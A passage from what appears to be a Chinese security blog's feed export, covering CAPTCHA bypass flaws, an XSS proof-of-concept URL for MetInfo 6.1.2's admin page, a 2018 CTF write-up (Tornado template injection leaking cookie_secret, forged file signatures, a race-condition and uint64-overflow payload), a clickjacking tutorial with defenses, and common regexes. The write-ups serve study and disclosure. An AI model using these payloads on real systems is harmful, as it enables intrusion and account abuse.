alt=""></p><ol><li>客户端发起一个请求；</li><li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li><li>服务端将验证码和SessionID一并返回给客户端；</li><li>客户端提交验证码连同SessionID给服务端；</li><li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li></ol><p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p><h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul><li>客户端生成验证码<ul><li>验证码由客户端js生成并且仅仅在客户端用js验证</li></ul></li><li>验证码输出客户端<ul><li>输出在html中（神一样的程序员）</li></ul></li><li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li></ul><h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul><li>验证码不过期，没有及时销毁会话导致验证码复用<ul><li>这个是最常见的，乌云上面有大量的案例。</li></ul></li><li>没有进行非空判断<ul><li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li><li>比如去掉cookie中的某些值或者请求中验证码参数</li></ul></li><li>产生的验证码问题集内的答案非常有限</li></ul><h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p><p>基于机器学习识别验证码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-乌云知识库&quot;&gt;&lt;a href=&quot;#0x00-乌云知识库&quot; class=&quot;headerlink&quot; title=&quot;0x00 乌云知识库:&quot;&gt;&lt;/a&gt;0x00 乌云知识库:&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://drops.ichenfei
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="web" scheme="http://mang0.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Xss in MetInfo V6.1.2</title>
    <link href="http://mang0.me/archives/a5c61176/"/>
    <id>http://mang0.me/archives/a5c61176/</id>
    <published>2018-10-15T18:16:08.000Z</published>
    <updated>2018-10-15T18:28:13.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201810160210_976.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xss-in-MetInfo-V6-1-2&quot;&gt;&lt;a href=&quot;#Xss-in-MetInfo-V6-1-2&quot; class=&quot;headerlink&quot; title=&quot;Xss in MetInfo V6.1.2&quot;&gt;&lt;/a&gt;Xss in MetInfo V6.1.2&lt;/
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="cve" scheme="http://mang0.me/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>护网杯wp</title>
    <link href="http://mang0.me/archives/173905c2/"/>
    <id>http://mang0.me/archives/173905c2/</id>
    <published>2018-10-13T15:53:02.000Z</published>
    <updated>2018-10-23T15:58:36.634Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\xleEWng.png" alt=""></p><p>另外学习：</p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x26;&#x6c;&#x6e;&#x29;&#36;&#x37;&#x5f;&#120;&#x49;&#64;&#119;&#74;&#x30;&#x50;&#x41;&#x5e;&#x39;&#x51;&#49;&#x23;&#56;&#x3f;&#x6b;&#x68;&#x6a;&#x28;&#52;&#97;&#x6f;&#50;&#117;&#x72;&#x43;&#98;&#x4c;&#x33;&#72;&#69;&#126;&#46;&#71;&#112;&#122;&#x46;&#102;">&#x26;&#x6c;&#x6e;&#x29;&#36;&#x37;&#x5f;&#120;&#x49;&#64;&#119;&#74;&#x30;&#x50;&#x41;&#x5e;&#x39;&#x51;&#49;&#x23;&#56;&#x3f;&#x6b;&#x68;&#x6a;&#x28;&#52;&#97;&#x6f;&#50;&#117;&#x72;&#x43;&#98;&#x4c;&#x33;&#72;&#69;&#126;&#46;&#71;&#112;&#122;&#x46;&#102;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;easy-tornado&quot;&gt;&lt;a href=&quot;#easy-tornado&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>web漏洞挖掘之点击劫持漏洞</title>
    <link href="http://mang0.me/archives/95d370e7/"/>
    <id>http://mang0.me/archives/95d370e7/</id>
    <published>2018-10-11T06:13:02.000Z</published>
    <updated>2018-10-15T00:40:51.589Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web漏洞挖掘之点击劫持漏洞"><a href="#web漏洞挖掘之点击劫持漏洞" class="headerlink" title="web漏洞挖掘之点击劫持漏洞"></a>web漏洞挖掘之点击劫持漏洞</h1><h2 id="0x00-点击劫持的概念"><a href="#0x00-点击劫持的概念" class="headerlink" title="0x00 点击劫持的概念"></a>0x00 点击劫持的概念</h2><p>点击劫持clickjacking，也叫UI-覆盖攻击（UI redress attack）；最早是在2008年，由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼首创。</p><p>百度百科上对其的定义如下： 它是通过覆盖不可见的框架误导受害者点击。 虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112329_760.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112329_533.png" alt=""></p><p>图片中，都是进行了iframe嵌套，构成一个页面 来诱使用户进行点击。 以上就是点击劫持的一个基本概念 </p><h2 id="0x01点击劫持攻击的原理"><a href="#0x01点击劫持攻击的原理" class="headerlink" title="0x01点击劫持攻击的原理"></a>0x01点击劫持攻击的原理</h2><p>点击劫持实际上是一种视觉上的欺骗手段，攻击者通过利用一个透明的、不可见的iframe，覆盖在某网页上，然后诱导用户在该网页上进行点击等操作，而此时用户在不知情的情况下点击了透明的iframe页面 。攻击者通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。 如使用css调整图片大小位置，通过设置opacity参数调整元素透明度等；目的都是让用户就无法看到含恶意代码的目标网页。 </p><p>这是点击劫持的原理，关键在于构造不可见的透明iframe来进行利用； </p><h2 id="0x02-挖掘的思路"><a href="#0x02-挖掘的思路" class="headerlink" title="0x02 挖掘的思路"></a>0x02 挖掘的思路</h2><p>1.我们只需要创建一个iframe的页面嵌套就可以简单的测试 </p><p>如果目标应用支持iframe进行页面嵌套，那么基本断定网站存在点击劫持攻击漏洞 比如<code>&lt;iframe src=&quot;http://target.com&quot;/&gt;</code> ，假设该页面上显示hello world 如果通过iframe嵌套后能显示为 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112339_70.png" alt=""></p><p>基本就能确定存在点击劫持风险 </p><p>2.通过目标的HTTP响应头是否设置好了X-Frame-Options字段，是否有JavaScript的Frame Busting机制，也可以进行判断 ，比如在用常见的WVS进行网站扫描时，会经常看到这样的信息： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112340_436.jpg" alt=""></p><p>这就是通过判断是否存在X-Frame-Options响应头来处理 其他辅助工具进行clickjacking漏洞探测的时候，也都基本上基于以上情况进行处理 </p><h2 id="0x03-举列子"><a href="#0x03-举列子" class="headerlink" title="0x03 举列子"></a>0x03 举列子</h2><p>这两处代码截图是github上的clickjacking扫描的代码，可以参考：<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/D4Vinci/Clickjacking-Tester</a> <a href="qq://txfile/#" target="_blank" rel="external">https://github.com/LTF1633242320/D-TECT</a> </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112341_651.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112341_810.png" alt=""></p><p>点击劫持 主要是靠点击，也有通过拖拽进行劫持实现的 </p><p>这种点击劫持的案例，比较知名的包括：Facebook 的‘likejacking’攻击、Adobe Flash Player 网站漏洞、Twitter 的 Don’t click 攻击、谷歌账户点击劫持攻击等 </p><p>在诸多点击劫持案例中，最为经典的案例是攻击者通过flash构造出点击劫持，最终控制用户电脑摄像头事件; </p><p>首先，攻击者构造一个flash小游戏，并贴心逼真地显示了游戏得分以及游戏耗时，诱导用户试玩；在试玩过程中引导用户点击不停变换位置的“click”按钮， 而其实在游戏界面中隐藏了一个看不见的iframe </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112354_232.png" alt=""></p><p>攻击通过诱导用户使用鼠标点击看似随意的位置，来完成较为复杂的操作。 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112355_209.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_575.png" alt=""></p><p>并最终开启了用户的摄像头 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_551.png" alt=""></p><p>某浪博客关注点击劫持 </p><p>在新浪博客的“加关注”处： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_303.jpg" alt=""></p><p>通过简单构造的html页面，如下， </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_673.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_64.png" alt=""></p><p>通过构造iframe 从而进行博客关注数量的刷新 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_869.jpg" alt=""></p><p>当然可以再对html页面进行精心美化调整，从而大面积进行点击劫持攻击的实施。 分享一个github上的类似开启摄像头的一个demo，可以在做安全意识培训是当演示了<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/thomaspatzke/Clickjacking-Exploit</a></p><p>低版本IE时代的东西了吧 用浏览器插件 </p><p>html5可以直接调用摄像头  前段时间有朋友搞得一个xss用HTML5调用摄像头，直接可以看到使用者照片 </p><h2 id="0x04-点击劫持与其他漏洞结合效果"><a href="#0x04-点击劫持与其他漏洞结合效果" class="headerlink" title="0x04 点击劫持与其他漏洞结合效果"></a>0x04 点击劫持与其他漏洞结合效果</h2><p>可以配合CSRF  </p><p>反射型xss可以和点击劫持一起形成差不多储存型xss的效果</p><p>反射XSS直接利用需要对方点击，如果直接把包含反射XSS的链接发送给受害者，比较唐突难以利用，所以如果将点击劫持与反射xss结合起来，利用iframe嵌套诱导，也就基本能达到存储XSS的效果 </p><h2 id="0x05-点击劫持漏洞的防御方法"><a href="#0x05-点击劫持漏洞的防御方法" class="headerlink" title="0x05 点击劫持漏洞的防御方法"></a>0x05 点击劫持漏洞的防御方法</h2><p>点击劫持漏洞的防御 主要是两种，一个是通过Frame busting防御、一种是通过添加X-Frame-Options属性进行防御 </p><p>frame busting防御，通过js代码禁止iframe的嵌套，如判断顶层窗口跳转： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112359_756.png" alt=""></p><p>下面是一些常见Frame busting： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112359_295.png" alt=""></p><p>但frame busting存在被绕过的可能，如多层iframe嵌套等； 在HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的脚本执行，从而可以使得frame busting失效 ,比如在html5中进行绕过：设置<iframe>属性：sandbox </iframe></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120000_760.png" alt=""></p><p>当sandbox 仅设置为allow-forms时，js是不被执行的 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120000_246.png" alt=""></p><p>设置<iframe>属性：security；当security设置为restricted后，frame中的脚本也将不能执行；但仅限于IE ，如此一来，由于无法执行js脚本，则通过JS来判断顶层跳转将失败 </iframe></p><p>第二种方式，设置X-Frame-Options属性； X-Frame-Options是一个微软提出的一个HTTP响应头；用来给浏览器指示允许一个页面可否在 <frame>, <iframe> 或者 <object> 中展现的标记。 </object></iframe></p><p>通过设置X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持；这是目前处理点击劫持攻击的最优且最可靠的手段； X-Frame-Options 的三个可选值：  Ø    DENY  Ø    SAMEORIGIN  Ø    ALLOW-FROM origin </p><p>以下是这三个可选值的表义： 如果设置为 DENY，表示该页面不允许在 frame 中展示，即便是在同源域名的页面中嵌套也不允许； </p><p>如果设置为 SAMEORIGIN，表示该页面可以在同源域名页面的 frame 中嵌套展示； 如果设置为 ALLOW-FROM，表示该页面可以在指定来源的 frame 中嵌套展示（origin为允许frame加载的页面地址）； </p><p>在各个平台中间件中X-Frame-Options的配置不一样， 在IIS环境中，在web站点的web.config中配置。 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_277.png" alt=""></p><p>在apache中： 先开启mod_<a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>，即在httpd.conf中去掉“LoadModule headers<em>module modules/mod</em><a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>”前的#； 再.修改httpd.conf，添加下面内容：Header always append X-Frame-Options DENY 修改完如下: </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_486.png" alt=""></p><p>如果同一台apache服务器上有多个站点，只想针对其中一个站点进行配置，可以修改.htaccess文件，添加如下内容： Header append X-FRAME-OPTIONS “DENY” </p><p>如果是nginx，则修改nginx.conf,在server下添加下面内容： add_header X-Frame-Options “DENY”; 添加完成如下： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_76.png" alt=""></p><p>以上主要是针对服务端的防御，如果是客户端的话，那就是保持浏览器的及时升级更新， 最新版浏览器通常具备更好更多的安全机制保护客户的信息安全，及时升级更新浏览器，可从一定程度上进行漏洞攻击的有效防范 </p><p>另一方面，作为客户端，可以通过安装浏览器的扩展插件，达到对潜在威胁进行阻止及警告，及时判断页面中的不安全因素； 如果你使用的是Firefox，则可以安装插件NoScript，在选项中设置禁止<iframe>，效果如下： </iframe></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120002_346.png" alt=""></p><p>有了X-Frame-Options的http头差不多就是不能进行点击劫持了吧 </p><p>这里顺便分享几个关于点击劫持的PoC工具，师傅们可以玩玩： </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/enddo/CJExploiter</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/sensepost/jack</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/samyk/quickjack</a>     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;a href=&quot;#web漏洞挖掘之点击劫持漏洞&quot; class=&quot;headerlink&quot; title=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;/a&gt;web漏洞挖掘之点击劫持漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x00-点击劫持的概念&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="Web漏洞" scheme="http://mang0.me/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>20个常用的正则表达式</title>
    <link href="http://mang0.me/archives/7fe4b50e/"/>
    <id>http://mang0.me/archives/7fe4b50e/</id>
    <published>2018-10-09T08:29:34.000Z</published>
    <updated>2018-10-15T00:40:51.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="20个常用的正则表达式"><a href="#20个常用的正则表达式" class="headerlink" title="20个常用的正则表达式"></a>20个常用的正则表达式</h1><h2 id="1-校验密码强度"><a href="#1-校验密码强度" class="headerlink" title="1 . 校验密码强度**"></a>1 . 校验密码强度**</h2><p>密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。</p><pre><code>^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></pre><h2 id="2-校验中文"><a href="#2-校验中文" class="headerlink" title="2. 校验中文"></a><strong>2. 校验中文</strong></h2><p>字符串仅能是中文。</p><pre><code>^[\\u4e00-\\u9fa5]{0,}$</code></pre><h2 id="3-由数字、26个英文字母或下划线组成的字符串"><a href="#3-由数字、26个英文字母或下划线组成的字符串" class="headerlink" title="3. 由数字、26个英文字母或下划线组成的字符串"></a><strong>3. 由数字、26个英文字母或下划线组成的字符串</strong></h2><pre><code>^\\w+$</code></pre><h2 id="4-校验E-Mail-地址"><a href="#4-校验E-Mail-地址" class="headerlink" title="4. 校验E-Mail 地址"></a><strong>4. 校验E-Mail 地址</strong></h2><p>同密码一样，下面是E-mail地址合规性的正则检查语句。</p><pre><code>[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</code></pre><h2 id="5-校验身份证号码"><a href="#5-校验身份证号码" class="headerlink" title="5. 校验身份证号码"></a><strong>5. 校验身份证号码</strong></h2><p>下面是身份证号码的正则校验。15 或 18位。</p><p>15位：</p><pre><code>^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$</code></pre><p>18位：</p><pre><code>^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$</code></pre><h2 id="6-校验日期"><a href="#6-校验日期" class="headerlink" title="6. 校验日期"></a><strong>6. 校验日期</strong></h2><p>“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。</p><pre><code>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</code></pre><h2 id="7-校验金额"><a href="#7-校验金额" class="headerlink" title="7. 校验金额"></a><strong>7. 校验金额</strong></h2><p>金额校验，精确到2位小数。</p><pre><code>^[0-9]+(.[0-9]{2})?$</code></pre><h2 id="8-校验手机号"><a href="#8-校验手机号" class="headerlink" title="8. 校验手机号"></a><strong>8. 校验手机号</strong></h2><p>下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码）</p><pre><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$</code></pre><h2 id="9-判断IE的版本"><a href="#9-判断IE的版本" class="headerlink" title="9. 判断IE的版本"></a><strong>9. 判断IE的版本</strong></h2><p>IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。</p><pre><code>^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$</code></pre><h2 id="10-校验IP-v4地址"><a href="#10-校验IP-v4地址" class="headerlink" title="10. 校验IP-v4地址"></a><strong>10. 校验IP-v4地址</strong></h2><p>IP4 正则语句。</p><pre><code>\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b</code></pre><h2 id="11-校验IP-v6地址"><a href="#11-校验IP-v6地址" class="headerlink" title="11. 校验IP-v6地址"></a><strong>11. 校验IP-v6地址</strong></h2><p>IP6 正则语句。</p><pre><code>(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))</code></pre><h2 id="12-检查URL的前缀"><a href="#12-检查URL的前缀" class="headerlink" title="12. 检查URL的前缀"></a><strong>12. 检查URL的前缀</strong></h2><p>应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。</p><pre><code>if (!s.match(/^[a-zA-Z]+:\\/\\//)){    s = &#39;http://&#39; + s;}</code></pre><h2 id="13-提取URL链接"><a href="#13-提取URL链接" class="headerlink" title="13. 提取URL链接"></a><strong>13. 提取URL链接</strong></h2><p>下面的这个表达式可以筛选出一段文本中的URL。</p><pre><code>^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)?</code></pre><h2 id="14-文件路径及扩展名校验"><a href="#14-文件路径及扩展名校验" class="headerlink" title="14. 文件路径及扩展名校验"></a><strong>14. 文件路径及扩展名校验</strong></h2><p>验证windows下文件路径和扩展名（下面的例子中为.txt文件）</p><pre><code>^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$</code></pre><h2 id="15-提取Color-Hex-Codes"><a 